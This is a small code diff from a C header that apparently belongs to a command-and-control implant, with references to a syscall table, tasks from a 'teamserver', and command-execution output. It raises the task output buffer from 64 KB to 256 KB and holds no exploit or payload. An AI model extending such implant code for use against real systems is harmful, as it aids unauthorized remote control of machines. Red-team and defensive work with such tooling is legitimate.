@@ -292,8 +292,8 @@ typedef struct _SYSCALL_TABLE   SYSCALL_TABLE;
 #define MAX_PENDING_TASKS   16
 #define MAX_TASK_RESULTS    16
 
-/* Maximum output buffer for command execution (64 KB) */
-#define TASK_OUTPUT_MAX     (64 * 1024)
+/* Maximum output buffer for command execution (256 KB) */
+#define TASK_OUTPUT_MAX     (256 * 1024)
 
 typedef struct _TASK {
     char    task_id[64];        /* UUID from teamserver                */
